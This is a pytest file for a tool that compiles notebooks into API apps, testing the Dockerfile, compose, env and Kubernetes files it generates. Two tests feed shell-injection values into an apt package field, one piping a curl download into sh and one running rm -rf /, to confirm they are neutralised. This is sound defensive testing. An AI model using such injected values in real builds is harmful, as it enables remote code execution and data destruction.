import ast
import http.server
import json
import os
import socket
import subprocess
import sys
import threading
import time
import urllib.error
import urllib.request
from pathlib import Path

import nbformat
import pytest

from backend.compiler import (
    _drop_private_functions,
    _explicit_requirement_package_name,
    _extract_background_overrides,
    _extract_deprecated_functions,
    _extract_excluded_imports,
    _extract_explicit_apt_packages,
    _extract_explicit_requirements,
    _extract_private_function_names,
    _filter_functions_by_name,
    _normalize_distribution_name,
    clear_stale_export_artifacts,
    COMPILE_LOCK,
    compile_notebook,
    compile_notebook_to_api,
    compiling_python_version,
    extract_third_party_imports,
    package_name_for_output_dir,
    resolve_requirements,
    STANDARD_LIBS,
    THIS_TOOLS_OWN_PACKAGE_NAME,
)
from backend.generator.docker_generator import (
    apt_install_content,
    docker_compose_content,
    dockerfile_content,
    env_example_content,
    generate_dockerfile,
    generate_dockerignore,
    generate_docker_compose,
    generate_env_example,
)
from backend.generator.kubernetes_generator import (
    generate_kubernetes_manifest,
    kubernetes_manifest_content,
)

PROJECT_ROOT = Path(__file__).resolve().parents[1]


def test_compiler_pipeline():

    output_dir = "test_generated"

    compile_notebook(
        "notebooks/sample.ipynb",
        output_dir
    )

    assert Path(
        f"{output_dir}/app.py"
    ).exists()

    assert Path(
        f"{output_dir}/requirements.txt"
    ).exists()

    assert Path(
        f"{output_dir}/Dockerfile"
    ).exists()


def test_compiler_pipeline_dockerfile_runs_as_non_root_with_a_healthcheck(tmp_path):
    """Confirmed exploitable before this fix: the generated Dockerfile had
    no USER directive (the container ran as root, needlessly widening the
    blast radius of any RCE-class bug) and no HEALTHCHECK, even though
    the generated app already exposes GET /health for exactly that
    purpose -- so orchestrators (Compose, Swarm, a bare `docker run`) had
    no way to tell a hung/crashed process apart from a healthy one.
    """

    notebook = nbformat.v4.new_notebook()

    notebook.cells.append(
        nbformat.v4.new_code_cell(
            "def add(a: int, b: int) -> int:\n"
            "    return a + b\n"
        )
    )

    notebook_path = tmp_path / "nb.ipynb"

    with open(notebook_path, "w", encoding="utf-8") as f:
        nbformat.write(notebook, f)

    output_dir = tmp_path / "generated"

    compile_notebook(str(notebook_path), str(output_dir))

    dockerfile = (output_dir / "Dockerfile").read_text(encoding="utf-8")

    assert "USER appuser" in dockerfile
    assert "HEALTHCHECK" in dockerfile
    assert "/health" in dockerfile
    # USER must come after the app's files are owned by that user, and
    # before the CMD that actually runs the app as it.
    assert dockerfile.index("chown") < dockerfile.index("USER appuser") < dockerfile.index("CMD [")


def test_compiler_pipeline_dockerfile_sets_unbuffered_and_no_bytecode_env_vars(
    tmp_path,
):
    """Confirmed missing before this fix: without PYTHONUNBUFFERED=1, a
    container's stdout is block-buffered (never a real terminal), so
    uvicorn's own request logs and any print() the notebook's own code
    does can sit unflushed for a long time or be lost entirely if the
    container is killed -- exactly the real-time output `docker logs` and
    any log-aggregation pipeline are expected to see. Without
    PYTHONDONTWRITEBYTECODE=1, the container writes a .pyc cache into its
    writable layer on every cold start -- the exact kind of artifact this
    project already treats as noise to exclude everywhere else it can
    appear (see EXCLUDED_GENERATED_DIR_NAMES in backend/inspector.py) --
    and would outright fail on a container run with a read-only root
    filesystem.
    """

    notebook = nbformat.v4.new_notebook()

    notebook.cells.append(
        nbformat.v4.new_code_cell(
            "def add(a: int, b: int) -> int:\n"
            "    return a + b\n"
        )
    )

    notebook_path = tmp_path / "nb.ipynb"

    with open(notebook_path, "w", encoding="utf-8") as f:
        nbformat.write(notebook, f)

    output_dir = tmp_path / "generated"

    compile_notebook(str(notebook_path), str(output_dir))

    dockerfile = (output_dir / "Dockerfile").read_text(encoding="utf-8")

    assert "ENV PYTHONUNBUFFERED=1" in dockerfile
    assert "ENV PYTHONDONTWRITEBYTECODE=1" in dockerfile
    # Set immediately after FROM, before anything that runs Python (pip,
    # then the app itself), so both apply universally rather than only
    # to some later step.
    assert (
        dockerfile.index("FROM python")
        < dockerfile.index("ENV PYTHONUNBUFFERED=1")
        < dockerfile.index("RUN pip install")
    )


def test_generate_dockerfile_sets_unbuffered_and_no_bytecode_env_vars(tmp_path):

    output_path = tmp_path / "Dockerfile"

    generate_dockerfile(str(output_path), "generated")

    dockerfile = output_path.read_text(encoding="utf-8")

    assert "ENV PYTHONUNBUFFERED=1" in dockerfile
    assert "ENV PYTHONDONTWRITEBYTECODE=1" in dockerfile


def test_generate_dockerfile_cmd_actually_honors_port_env_var_at_runtime(tmp_path):
    """Most real PaaS deploy targets (Cloud Run, Render, Heroku, ...)
    assign the container's listening port via a $PORT environment variable
    at start time and require the process to actually bind to it -- there
    is no fixed port they'll forward to instead. Before this, CMD was a
    plain exec-form array with "--port", "8000" hardcoded, which -- with
    no shell involved in exec form -- couldn't read $PORT at all no matter
    what a deploy target set it to.

    Runs the Dockerfile's actual CMD shell command (with `uvicorn` swapped
    for `echo` so no real server needs to start) to prove $PORT is
    genuinely substituted by the shell at container start, not just
    present as literal text somewhere in the Dockerfile.
    """

    output_path = tmp_path / "Dockerfile"

    generate_dockerfile(str(output_path), "generated")

    dockerfile = output_path.read_text(encoding="utf-8")

    cmd_line = next(
        line for line in dockerfile.splitlines()
        if line.startswith('CMD ["sh", "-c",')
    )
    shell_command = json.loads(cmd_line[len("CMD "):])[2]
    shell_command = shell_command.replace("uvicorn", "echo", 1)

    default_result = subprocess.run(
        ["sh", "-c", shell_command], capture_output=True, text=True
    )
    assert "--port 8000" in default_result.stdout

    custom_env = dict(os.environ)
    custom_env["PORT"] = "8080"

    custom_result = subprocess.run(
        ["sh", "-c", shell_command],
        capture_output=True,
        text=True,
        env=custom_env,
    )
    assert "--port 8080" in custom_result.stdout


def test_generate_dockerfile_healthcheck_actually_honors_port_env_var_at_runtime(
    tmp_path,
):
    """The HEALTHCHECK must probe whatever port uvicorn actually bound to
    (see the CMD test above), not a stale hardcoded 8000 -- otherwise a
    deploy target assigning a non-default $PORT would leave Docker
    reporting the container "unhealthy" forever, regardless of how healthy
    the app inside it actually is.

    Runs the Dockerfile's actual HEALTHCHECK python snippet against a real
    local HTTP server bound to a non-default port, with $PORT set to match
    -- confirming it resolves and reaches that exact port rather than only
    checking the Dockerfile's text for the right substring.
    """

    output_path = tmp_path / "Dockerfile"

    generate_dockerfile(str(output_path), "generated")

    dockerfile = output_path.read_text(encoding="utf-8")

    healthcheck_line = next(
        line for line in dockerfile.splitlines()
        if line.strip().startswith("CMD python -c")
    )
    snippet = healthcheck_line.split('CMD python -c "', 1)[1].rsplit('"', 1)[0]

    class _Handler(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.end_headers()

        def log_message(self, *args):
            pass

    server = http.server.HTTPServer(("127.0.0.1", 0), _Handler)
    port = server.server_address[1]
    server_thread = threading.Thread(target=server.serve_forever, daemon=True)
    server_thread.start()

    try:
        custom_env = dict(os.environ)
        custom_env["PORT"] = str(port)

        result = subprocess.run(
            [sys.executable, "-c", snippet],
            capture_output=True,
            text=True,
            env=custom_env,
            timeout=10,
        )
        assert result.returncode == 0, result.stderr
    finally:
        server.shutdown()
        server_thread.join(timeout=5)


def test_compiler_pipeline_example_payload_is_a_list_for_an_optional_list_parameter(
    tmp_path,
):
    """Confirmed exploitable before this fix: normalize_type_annotation
    (backend/parser/ast_parser.py) peeled "Optional[" off
    "Optional[List[float]]" with a blind ".replace(']', '')" that
    stripped *every* closing bracket in the string, corrupting the
    surviving "List[float]]" into the mismatched "List[float" instead of
    "List[float]" -- which matched none of the type_defaults lookups, so
    an extremely common real-world signature like
    `scores: Optional[List[float]] = None` baked a `None` example into
    the generated app's own OpenAPI schema for a field that's actually a
    list.
    """

    notebook = nbformat.v4.new_notebook()

    notebook.cells.append(
        nbformat.v4.new_code_cell(
            "from typing import List, Optional\n\n"
            "def summarize(scores: Optional[List[float]] = None) -> int:\n"
            "    return len(scores) if scores else 0\n"
        )
    )

    notebook_path = tmp_path / "nb.ipynb"

    with open(notebook_path, "w", encoding="utf-8") as f:
        nbformat.write(notebook, f)

    output_dir = tmp_path / "generated"

    compile_notebook(str(notebook_path), str(output_dir))

    app_source = (output_dir / "app.py").read_text(encoding="utf-8")

    assert "'example': {'scores': []}" in app_source
    assert "'example': {'scores': None}" not in app_source


def test_compiler_pipeline_example_payload_actually_validates_for_date_and_uuid_params(
    tmp_path,
):
    """Confirmed exploitable before this fix: generate_example_payload
    (backend/parser/ast_parser.py) had no entry for "date"/"UUID" (or
    "datetime"/"time"/"Decimal") in its own type_defaults map, so a
    `def f(event_date: date)` parameter baked a `None` example into the
    generated app's own OpenAPI schema -- exactly what generate_curl_
    commands/generate_postman_collection's own "ready-to-paste (or
    execute)" commands, and a default `app-call`, would actually POST.
    Verified end to end, not just that the example value looks right:
    POSTing that exact example_payload against a real compiled endpoint
    must succeed (200), not fail Pydantic's own real validation (422).
    """

    notebook = nbformat.v4.new_notebook()

    notebook.cells.append(
        nbformat.v4.new_code_cell(
            "from datetime import date\n"
            "from uuid import UUID\n\n"
            "def schedule_event(event_date: date, owner: UUID) -> str:\n"
            "    return f'{owner}:{event_date}'\n"
        )
    )

    notebook_path = tmp_path / "nb.ipynb"
    with open(notebook_path, "w", encoding="utf-8") as f:
        nbformat.write(notebook, f)

    workdir = tmp_path / "workdir"
    workdir.mkdir()

    script = f"""
import sys

sys.path.insert(0, {str(PROJECT_ROOT)!r})
sys.path.insert(0, {str(workdir)!r})

from backend.compiler import compile_notebook
from backend.inspector import inspect_notebook_data

compile_notebook({str(notebook_path)!r}, "generated")

data = inspect_notebook_data({str(notebook_path)!r})
[func] = data["functions"]
example_payload = func["example_payload"]
assert example_payload == {{
    "event_date": "2024-01-01",
    "owner": "00000000-0000-0000-0000-000000000000",
}}, example_payload

from generated.app import app
from fastapi.testclient import TestClient

client = TestClient(app)
response = client.post(
    "/schedule_event", json=example_payload,
    headers={{"X-API-Key": "notebook-to-api-dev-key"}},
)
assert response.status_code == 200, response.text

print("EXAMPLE_PAYLOAD_DATE_UUID_E2E_OK")
"""

    proc = subprocess.run(
        [sys.executable, "-c", script],
        cwd=str(workdir),
        capture_output=True,
        text=True,
        timeout=60,
    )

    assert proc.returncode == 0, proc.stdout + proc.stderr
    assert "EXAMPLE_PAYLOAD_DATE_UUID_E2E_OK" in proc.stdout


def test_compiling_python_version_matches_the_running_interpreter():

    version = compiling_python_version()

    assert version == f"{sys.version_info.major}.{sys.version_info.minor}"


def test_generate_dockerfile_defaults_to_python_3_11_when_not_specified(tmp_path):
    """Preserves generate_dockerfile's previous behavior for a direct
    caller that doesn't pass python_version -- only compile_notebook_to_api
    (via compiling_python_version()) is expected to override it.
    """

    output_path = tmp_path / "Dockerfile"

    generate_dockerfile(str(output_path), "generated")

    assert "FROM python:3.11-slim" in output_path.read_text(encoding="utf-8")


def test_generate_dockerfile_uses_the_given_python_version(tmp_path):

    output_path = tmp_path / "Dockerfile"

    generate_dockerfile(str(output_path), "generated", python_version="3.12")

    assert "FROM python:3.12-slim" in output_path.read_text(encoding="utf-8")


def test_apt_install_content_is_empty_for_no_packages():

    assert apt_install_content(None) == ""
    assert apt_install_content([]) == ""


def test_apt_install_content_lists_every_package_on_one_line():

    content = apt_install_content(["libpq-dev", "gcc"])

    assert "RUN apt-get update && apt-get install -y --no-install-recommends" in content
    assert "libpq-dev gcc" in content
    assert "rm -rf /var/lib/apt/lists/*" in content


def test_apt_install_content_preserves_a_version_pin_unquoted():
    """A real, valid apt version pin (containing "=", "+", "."; no shell
    metacharacters) needs no quoting at all -- shlex.quote leaves it
    completely unchanged, the identical byte-for-byte output this
    function already produced before the shlex.quote fix existed.
    """

    content = apt_install_content(["libpq-dev=13.11-0+deb12u1"])

    assert "libpq-dev=13.11-0+deb12u1 \\" in content
    assert "'" not in content


def test_apt_install_content_neutralizes_a_shell_injection_attempt():
    """Confirmed exploitable before this fix: _extract_explicit_apt_
    packages (backend/compiler.py) matches an "apt-requires" directive's
    own package token against `\\S+` -- any non-whitespace text, not
    validated as a plausible apt package/version-pin token -- and this
    function's own bare (non-JSON-array) `RUN` instruction executes via
    `/bin/sh -c` at real `docker build` time. A value of
    "libpq-dev; curl http://x/y|sh #" produced a RUN line `docker build`
    executed as three real shell commands: install libpq-dev, pipe a
    remote script straight into `sh`, then comment out the rest of the
    line (silently dropping the trailing `rm -rf /var/lib/apt/lists/*`
    too) -- arbitrary command execution during the build, not merely an
    unusual package name.
    """

    import shlex as shlex_module

    malicious = "libpq-dev; curl http://x/y|sh #"

    content = apt_install_content([malicious])

    # Parsed back with shlex (the real shell's own tokenizing rules), the
    # malicious value survives as exactly one token -- apt-get can only
    # ever see it as one (invalid, cleanly failing) package name, never
    # as shell syntax with its own "curl"/"sh"/"#".
    run_line = content.splitlines()[1].rstrip(" \\")
    assert shlex_module.split(run_line) == [malicious]
    # The trailing cleanup command must still be intact, not swallowed
    # by the injected "#" comment the way it was before this fix.
    assert content.count("&& rm -rf /var/lib/apt/lists/*") == 1


def test_apt_install_content_escapes_an_embedded_single_quote():
    """A value containing its own literal single quote must not be able
    to close shlex.quote's own added quoting early. Verified by actually
    parsing the rendered line back with shlex (the real shell's own
    tokenizing rules) and confirming the malicious value survives as
    exactly one token, byte-for-byte -- not by pattern-matching the
    escaped text, which shlex.quote is free to spell differently across
    Python versions.
    """
    import shlex as shlex_module

    malicious = "libpq-dev'; rm -rf /; echo '"

    content = apt_install_content([malicious])

    run_line = content.splitlines()[1].rstrip(" \\")
    assert shlex_module.split(run_line) == [malicious]


def test_dockerfile_content_omits_apt_block_by_default():
    """The overwhelming majority of notebooks use no "apt-requires"
    directive at all -- the generated Dockerfile for one of them must be
    byte-for-byte identical to what dockerfile_content already produced
    before this parameter existed.
    """

    without_param = dockerfile_content("generated", "3.12")
    with_empty_list = dockerfile_content("generated", "3.12", apt_packages=[])
    with_none = dockerfile_content("generated", "3.12", apt_packages=None)

    assert without_param == with_empty_list == with_none
    assert "apt-get" not in without_param


def test_dockerfile_content_includes_apt_block_before_pip_install():
    """A system library needed to *build* a pip package (not merely to
    run it) must already be present before `pip install` runs, or the
    build itself fails with nothing installed yet to fix it.
    """

    content = dockerfile_content("generated", "3.12", apt_packages=["libpq-dev"])

    assert "libpq-dev" in content
    assert content.index("apt-get install") < content.index("pip install")


def test_dockerfile_content_apt_block_matches_apt_install_content():

    apt_packages = ["libpq-dev", "gcc"]

    full_dockerfile = dockerfile_content("generated", "3.12", apt_packages)

    assert apt_install_content(apt_packages) in full_dockerfile


def test_generate_dockerfile_writes_the_apt_block_when_given_packages(tmp_path):

    output_path = tmp_path / "Dockerfile"

    generate_dockerfile(
        str(output_path), "generated", python_version="3.12",
        apt_packages=["libpq-dev"],
    )

    content = output_path.read_text(encoding="utf-8")
    assert "apt-get install -y --no-install-recommends" in content
    assert "libpq-dev" in content


def test_compiler_pipeline_dockerfile_base_image_matches_the_compiling_interpreter(
    tmp_path, monkeypatch
):
    """Confirmed broken before this fix: the Dockerfile always hardcoded
    "FROM python:3.11-slim" regardless of what interpreter actually ran
    the compile -- while requirements.txt's versions (_pinned_requirement)
    are pinned against exactly that interpreter's installed packages. A
    pinned package whose wheels don't cover 3.11 (or that needs a newer
    Python) would silently break `docker build`'s
    `pip install -r requirements.txt` for anyone compiling on a different
    Python version, which this repository's own environment already is.
    """

    monkeypatch.setattr(
        "backend.compiler.compiling_python_version", lambda: "3.99"
    )

    notebook = nbformat.v4.new_notebook()

    notebook.cells.append(
        nbformat.v4.new_code_cell(
            "def add(a: int, b: int) -> int:\n"
            "    return a + b\n"
        )
    )

    notebook_path = tmp_path / "nb.ipynb"

    with open(notebook_path, "w", encoding="utf-8") as f:
        nbformat.write(notebook, f)

    output_dir = tmp_path / "generated"

    compile_notebook(str(notebook_path), str(output_dir))

    dockerfile = (output_dir / "Dockerfile").read_text(encoding="utf-8")

    assert "FROM python:3.99-slim" in dockerfile
    assert "FROM python:3.11-slim" not in dockerfile


def test_compiler_pipeline_generates_a_dockerignore_excluding_git_and_caches(tmp_path):
    """Confirmed exploitable before this fix: nothing wrote a
    .dockerignore alongside the Dockerfile, so `COPY . {package_name}/`
    picked up .git, __pycache__, local venvs, and notebooks from the
    build context into the image -- bloating it and, for .git, risking
    shipping history that was never meant to be in the image.
    """

    notebook = nbformat.v4.new_notebook()

    notebook.cells.append(
        nbformat.v4.new_code_cell(
            "def add(a: int, b: int) -> int:\n"
            "    return a + b\n"
        )
    )

    notebook_path = tmp_path / "nb.ipynb"

    with open(notebook_path, "w", encoding="utf-8") as f:
        nbformat.write(notebook, f)

    output_dir = tmp_path / "generated"

    compile_notebook(str(notebook_path), str(output_dir))

    dockerignore_path = output_dir / ".dockerignore"
    assert dockerignore_path.exists()

    dockerignore = dockerignore_path.read_text(encoding="utf-8")
    assert ".git/" in dockerignore
    assert "__pycache__/" in dockerignore
    assert ".venv/" in dockerignore


def test_generate_dockerignore_excludes_openapi_and_sdk_export_artifacts(tmp_path):
    """Confirmed exploitable before this fix: POST /api/export-openapi,
    POST /api/export-sdk, and the CLI's export-openapi/export-sdk
    commands all write openapi.json/openapi.yaml/sdk/ straight into the
    same output directory as the compiled app -- but the running app
    never reads any of them (it builds its OpenAPI schema live via
    custom_openapi(), not from a file on disk). Building/deploying any
    time after such an export baked these purely client-facing artifacts
    into the served image with no runtime benefit, the exact kind of
    build-context noise this .dockerignore already exists to keep out for
    .git/__pycache__/venvs/notebooks.
    """

    output_path = tmp_path / ".dockerignore"

    generate_dockerignore(str(output_path))

    dockerignore = output_path.read_text(encoding="utf-8")
    assert "openapi.json" in dockerignore
    assert "openapi.yaml" in dockerignore
    assert "sdk/" in dockerignore


def test_generate_dockerignore_excludes_compile_metadata(tmp_path):
    """.compile_metadata.json (write_compile_metadata, backend/compiler.py)
    is dashboard-internal bookkeeping written into the same output
    directory as the compiled app on every compile -- never read by the
    running app itself -- and its "source_notebook" field is the source
    notebook's absolute filesystem path on the compiling server. Before
    this fix, every `deploy`/`docker build` baked that server-side path
    straight into the shipped image, the exact class of build-context leak
    this .dockerignore already exists to prevent for openapi.json/
    openapi.yaml/sdk/.
    """

    output_path = tmp_path / ".dockerignore"

    generate_dockerignore(str(output_path))

    dockerignore = output_path.read_text(encoding="utf-8")
    assert ".compile_metadata.json" in dockerignore


def test_generate_dockerignore_excludes_docker_compose(tmp_path):
    """docker-compose.yml (generate_docker_compose, backend/generator/
    docker_generator.py) is now written into the same output directory
    as the compiled app on every compile too -- a purely local-dev/
    deploy-tooling convenience file the running app never reads at
    runtime, the identical "never read by the app, so it shouldn't ship
    in the image" reasoning this .dockerignore already applies to
    openapi.json/openapi.yaml/sdk/.
    """

    output_path = tmp_path / ".dockerignore"

    generate_dockerignore(str(output_path))

    dockerignore = output_path.read_text(encoding="utf-8")
    assert "docker-compose.yml" in dockerignore


def test_generate_dockerignore_excludes_readme(tmp_path):
    """README.md (generate_readme, backend/generator/docker_generator.py)
    is purely documentation for a human looking at the compiled output
    directory or a downloaded bundle -- never read by the running app
    itself, the identical reasoning this .dockerignore already applies to
    .env.example/docker-compose.yml.
    """

    output_path = tmp_path / ".dockerignore"

    generate_dockerignore(str(output_path))

    dockerignore = output_path.read_text(encoding="utf-8")
    assert "README.md" in dockerignore


def test_docker_compose_content_matches_generate_docker_composes_own_output(tmp_path):
    """docker_compose_content is the pure string generate_docker_compose
    itself writes to disk -- see dockerfile_content's own docstring for
    why this split exists. Confirms the two can't drift apart, the same
    "preview matches the real write" guarantee already covered for
    dockerfile_content/generate_dockerfile above.
    """

    env_vars = [
        {"name": "NOTEBOOK_API_KEY", "default": "dev-key", "description": "..."},
    ]

    output_path = tmp_path / "docker-compose.yml"

    generate_docker_compose(str(output_path), "myapp", env_vars)

    assert (
        output_path.read_text(encoding="utf-8")
        == docker_compose_content("myapp", env_vars)
    )


def test_docker_compose_content_uses_the_given_package_name_as_the_service_name():

    content = docker_compose_content("myapp", [])

    assert "services:" in content
    assert "  myapp:" in content
    assert "    build: ." in content


def test_docker_compose_content_sets_an_unless_stopped_restart_policy():
    """Compose's own default restart policy is "no" -- without this, a
    container that crashed or was OOM-killed just stayed down until an
    operator noticed and re-ran `docker compose up` by hand, defeating
    the whole point of a `docker compose up -d`-style unattended
    deployment.
    """

    content = docker_compose_content("generated", [])

    assert "    restart: unless-stopped\n" in content


def test_docker_compose_content_maps_port_on_both_sides_via_the_port_env_var():
    """The Dockerfile's own CMD/HEALTHCHECK bind/probe whatever $PORT is
    set to at container start (see dockerfile_content above) -- the
    compose file's own port mapping must track the exact same variable
    on *both* sides (host and container), or a caller overriding $PORT
    would map traffic to a container port the app never actually bound
    to.
    """

    content = docker_compose_content("generated", [])

    assert '"${PORT:-8000}:${PORT:-8000}"' in content
    assert "PORT=${PORT:-8000}" in content


def test_docker_compose_content_lists_every_env_var_with_its_own_default():

    env_vars = [
        {"name": "NOTEBOOK_API_KEY", "default": "dev-key", "description": "..."},
        {"name": "NOTEBOOK_API_MAX_TASKS", "default": "10000", "description": "..."},
    ]

    content = docker_compose_content("generated", env_vars)

    assert "NOTEBOOK_API_KEY=${NOTEBOOK_API_KEY:-dev-key}" in content
    assert "NOTEBOOK_API_MAX_TASKS=${NOTEBOOK_API_MAX_TASKS:-10000}" in content


def test_docker_compose_content_with_no_env_vars_still_maps_port():
    """An empty env_vars list (or None) must still produce a valid,
    usable compose file -- just with nothing beyond PORT in its own
    "environment:" section -- rather than a malformed file missing the
    "environment:" key's own required list entirely.
    """

    content = docker_compose_content("generated", [])

    assert "environment:\n      - PORT=${PORT:-8000}\n" in content

    content_none = docker_compose_content("generated", None)

    assert content_none == content


def test_generate_dockerignore_excludes_env_example(tmp_path):
    """.env.example (generate_env_example, backend/generator/
    docker_generator.py) is now written into the same output directory
    as the compiled app on every compile too -- a template for an
    operator to copy to their own .env, never read by the running app
    itself, the identical "never read by the app, so it shouldn't ship
    in the image" reasoning this .dockerignore already applies to
    Dockerfile/.dockerignore/docker-compose.yml.
    """

    output_path = tmp_path / ".dockerignore"

    generate_dockerignore(str(output_path))

    dockerignore = output_path.read_text(encoding="utf-8")
    assert ".env.example" in dockerignore


def test_env_example_content_matches_generate_env_examples_own_output(tmp_path):
    """env_example_content is the pure string generate_env_example itself
    writes to disk -- see dockerfile_content's own docstring for why this
    split exists. Confirms the two can't drift apart, the same "preview
    matches the real write" guarantee already covered for
    dockerfile_content/generate_dockerfile above.
    """

    env_vars = [
        {"name": "NOTEBOOK_API_KEY", "default": "dev-key", "description": "A key."},
    ]

    output_path = tmp_path / ".env.example"

    generate_env_example(str(output_path), env_vars)

    assert (
        output_path.read_text(encoding="utf-8")
        == env_example_content(env_vars)
    )


def test_env_example_content_lists_every_env_var_with_its_own_default_and_description():

    env_vars = [
        {
            "name": "NOTEBOOK_API_KEY", "default": "dev-key",
            "description": "The API key clients must present.",
        },
        {
            "name": "NOTEBOOK_API_MAX_TASKS", "default": "10000",
            "description": "Maximum pending background tasks.",
        },
    ]

    content = env_example_content(env_vars)

    assert "NOTEBOOK_API_KEY=dev-key" in content
    assert "# The API key clients must present." in content
    assert "NOTEBOOK_API_MAX_TASKS=10000" in content
    assert "# Maximum pending background tasks." in content


def test_env_example_content_always_includes_port():
    """PORT is deliberately excluded from GENERATED_APP_ENV_VARS itself
    (it's read by the Dockerfile's own CMD/HEALTHCHECK and docker-
    compose.yml's own "ports" mapping, never by the compiled app) --
    but docker_compose_content already includes it unconditionally in
    its own "environment:" section, and this must too, for the same
    reason: an operator commonly wants to override the host-side port
    without touching the generated docker-compose.yml itself.
    """

    content = env_example_content([])

    assert "PORT=8000" in content


def test_env_example_content_with_no_env_vars_is_still_a_valid_file():

    content = env_example_content(None)

    assert "PORT=8000" in content
    assert content == env_example_content([])


def test_env_example_content_produces_a_value_that_can_actually_be_parsed_as_env_assignments():
    """Every non-comment, non-blank line must be a real NAME=value
    assignment -- the whole point is that `cp .env.example .env` alone
    already reproduces the compiled app's own unconfigured behavior.
    """

    env_vars = [
        {"name": "NOTEBOOK_API_KEY", "default": "dev-key", "description": "A key."},
        {"name": "NOTEBOOK_API_MAX_TASKS", "default": "10000", "description": "Cap."},
    ]

    content = env_example_content(env_vars)

    assignment_lines = [
        line for line in content.splitlines()
        if line and not line.startswith("#")
    ]

    assert assignment_lines == [
        "PORT=8000",
        "NOTEBOOK_API_KEY=dev-key",
        "NOTEBOOK_API_MAX_TASKS=10000",
    ]


def test_compiler_pipeline_writes_apt_requires_directive_into_the_dockerfile(
    tmp_path
):
    """Confirmed missing before this feature: a notebook whose own
    dependency needs a system package present inside the image (e.g.
    `psycopg2` needing libpq-dev to build, or `opencv-python` needing
    libgl1 present at runtime) had exactly one path to a working image --
    hand-editing the generated Dockerfile after every single compile,
    since compile_notebook_to_api's own generate_dockerfile call never
    knew about anything beyond `pip install`.
    """

    notebook = nbformat.v4.new_notebook()
    notebook.cells.append(
        nbformat.v4.new_code_cell(
            "# notebook-to-api: apt-requires libpq-dev\n"
            "def add(a: int, b: int) -> int:\n    return a + b\n"
        )
    )

    notebook_path = tmp_path / "nb.ipynb"
    with open(notebook_path, "w", encoding="utf-8") as f:
        nbformat.write(notebook, f)

    output_dir = tmp_path / "generated"
    compile_notebook(str(notebook_path), str(output_dir))

    dockerfile = (output_dir / "Dockerfile").read_text(encoding="utf-8")
    assert "apt-get install -y --no-install-recommends" in dockerfile
    assert "libpq-dev" in dockerfile
    assert dockerfile.index("apt-get install") < dockerfile.index("pip install")


def test_compiler_pipeline_omits_apt_block_for_a_notebook_with_no_directive(
    tmp_path
):

    notebook = nbformat.v4.new_notebook()
    notebook.cells.append(
        nbformat.v4.new_code_cell(
            "def add(a: int, b: int) -> int:\n    return a + b\n"
        )
    )

    notebook_path = tmp_path / "nb.ipynb"
    with open(notebook_path, "w", encoding="utf-8") as f:
        nbformat.write(notebook, f)

    output_dir = tmp_path / "generated"
    compile_notebook(str(notebook_path), str(output_dir))

    dockerfile = (output_dir / "Dockerfile").read_text(encoding="utf-8")
    assert "apt-get" not in dockerfile


def test_compiler_pipeline_generates_a_docker_compose_file(tmp_path):
    """Confirmed missing before this feature: a compiled app had a
    Dockerfile but nothing to actually run it with beyond a hand-typed
    `docker run` -- POST /api/compile (and the CLI's own `compile`) now
    also writes a ready-to-use docker-compose.yml alongside it, on every
    compile, the same way the Dockerfile/.dockerignore already are.
    """

    notebook = nbformat.v4.new_notebook()
    notebook.cells.append(
        nbformat.v4.new_code_cell(
            "def add(a: int, b: int) -> int:\n    return a + b\n"
        )
    )

    notebook_path = tmp_path / "nb.ipynb"
    with open(notebook_path, "w", encoding="utf-8") as f:
        nbformat.write(notebook, f)

    output_dir = tmp_path / "generated"
    compile_notebook(str(notebook_path), str(output_dir))

    compose_path = output_dir / "docker-compose.yml"
    assert compose_path.is_file()

    compose = compose_path.read_text(encoding="utf-8")
    assert "services:\n  generated:\n    build: .\n" in compose
    assert "    restart: unless-stopped\n" in compose
    assert "NOTEBOOK_API_KEY=${NOTEBOOK_API_KEY:-notebook-to-api-dev-key}" in compose
    assert "NOTEBOOK_API_RATE_LIMIT_PER_MINUTE=${NOTEBOOK_API_RATE_LIMIT_PER_MINUTE:-0}" in compose


def test_compiler_pipeline_generates_an_env_example_file(tmp_path):
    """Confirmed missing before this feature: GET /api/env-vars-preview
    already answered "what env vars does a compiled app recognize" as
    structured JSON, but nothing ever actually wrote a ready-to-use
    .env.example an operator could `cp .env.example .env` from, unlike
    every other deployment artifact (Dockerfile, .dockerignore,
    docker-compose.yml) a compile already writes alongside app.py.
    """

    notebook = nbformat.v4.new_notebook()
    notebook.cells.append(
        nbformat.v4.new_code_cell(
            "def add(a: int, b: int) -> int:\n    return a + b\n"
        )
    )

    notebook_path = tmp_path / "nb.ipynb"
    with open(notebook_path, "w", encoding="utf-8") as f:
        nbformat.write(notebook, f)

    output_dir = tmp_path / "generated"
    compile_notebook(str(notebook_path), str(output_dir))

    env_example_path = output_dir / ".env.example"
    assert env_example_path.is_file()

    env_example = env_example_path.read_text(encoding="utf-8")
    assert "PORT=8000" in env_example
    assert "NOTEBOOK_API_KEY=notebook-to-api-dev-key" in env_example
    assert "NOTEBOOK_API_RATE_LIMIT_PER_MINUTE=0" in env_example


def test_generate_dockerignore_excludes_kubernetes_manifest(tmp_path):
    """kubernetes.yaml (generate_kubernetes_manifest, backend/generator/
    kubernetes_generator.py) is now written into the same output directory
    as the compiled app on every compile too -- a purely deploy-tooling
    convenience file the running app never reads at runtime, the identical
    "never read by the app, so it shouldn't ship in the image" reasoning
    this .dockerignore already applies to docker-compose.yml/.env.example.
    """

    output_path = tmp_path / ".dockerignore"

    generate_dockerignore(str(output_path))

    dockerignore = output_path.read_text(encoding="utf-8")
    assert "kubernetes.yaml" in dockerignore


def test_kubernetes_manifest_content_matches_generate_kubernetes_manifests_own_output(
    tmp_path
):
    """kubernetes_manifest_content is the pure string
    generate_kubernetes_manifest itself writes to disk -- see
    dockerfile_content's own docstring for why this split exists. Confirms
    the two can't drift apart, the same "preview matches the real write"
    guarantee already covered for dockerfile_content/generate_dockerfile
    above.
    """

    env_vars = [
        {"name": "NOTEBOOK_API_KEY", "default": "dev-key", "description": "..."},
    ]

    output_path = tmp_path / "kubernetes.yaml"

    generate_kubernetes_manifest(str(output_path), "myapp", env_vars)

    assert (
        output_path.read_text(encoding="utf-8")
        == kubernetes_manifest_content("myapp", env_vars)
    )


def test_kubernetes_manifest_content_uses_the_given_package_name_throughout():

    content = kubernetes_manifest_content("myapp", [])

    assert "  name: myapp\n" in content
    assert "    app: myapp\n" in content
    assert "image: myapp:latest\n" in content


def test_kubernetes_manifest_content_sanitizes_an_underscore_and_uppercase_package_name():
    """`package_name` only has to satisfy Python's own `isidentifier()`
    (package_name_for_output_dir, backend/compiler.py), which allows
    underscores and uppercase letters -- neither legal in a Kubernetes
